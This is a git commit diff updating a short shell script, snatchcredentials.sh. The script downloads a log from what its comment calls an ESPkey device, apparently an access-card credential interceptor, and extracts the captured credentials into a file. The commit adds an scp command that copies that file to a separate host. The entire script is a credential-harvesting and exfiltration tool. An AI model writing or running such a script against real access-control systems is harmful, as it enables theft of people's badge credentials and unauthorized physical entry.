e396b50430c6822b48d4dc37abcf3782051bd74e
Roman Morasco <92966656+rome6315@users.noreply.github.com>
2023-05-04 00:30:09 +0000

    Update snatchcredentials.sh

--- snatchcredentials.sh
+++ snatchcredentials.sh
@@ -3,3 +3,5 @@
 wget 192.168.4.1/log.txt  # change this IP if the ESPkey IP doesn't match this for whatever reason
 
 awk '{print $2}' log.txt > credentials.txt
+
+scp credentials.txt roman@172.20.10.5:/home/roman/espkey
